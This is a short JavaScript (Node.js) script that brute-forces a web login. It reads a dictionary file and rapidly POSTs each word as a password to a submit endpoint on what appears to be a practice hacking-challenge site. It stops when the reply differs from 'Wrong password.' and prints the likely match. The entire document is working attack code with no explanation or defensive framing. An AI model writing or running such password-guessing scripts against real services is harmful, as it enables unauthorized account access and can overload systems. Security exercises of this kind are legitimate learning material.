var request = require("request");
var fs = require("fs");
var allWords = [];
var counter = 11000;
var x = "";

fs.readFile("dictionary.txt", "utf8", doSomething);

function doSomething(error, contents) {
    console.log("stage 1")
    allWords = contents.split("\n");
    x = setInterval(doStuff, 10);
}

function doStuff() {
    request.post("https://hacking5.mrcodeswildride.com/submit", {
        form: { password: allWords[counter] }
    }, function(error, response, data) {
        if (data != "Wrong password.") {
            clearInterval(x);
            console.log("Stage 3:  " + response.request.body);
            for (var i = 0; i < 10; i++) {
                console.log(allWords[counter - 10 + i]);
            }
        }
    });
    counter++;
    if (counter % 100 == 0) {
        console.log("stage 2  " + counter + " : " + allWords[counter]);
    }
    if (counter % 1000 == 0) {
        var string = "";
        for (var i = 0; i < counter / allWords.length * 30; i++) {
            string += "|";
        }
        console.log("Progress: " + string);
    }
}
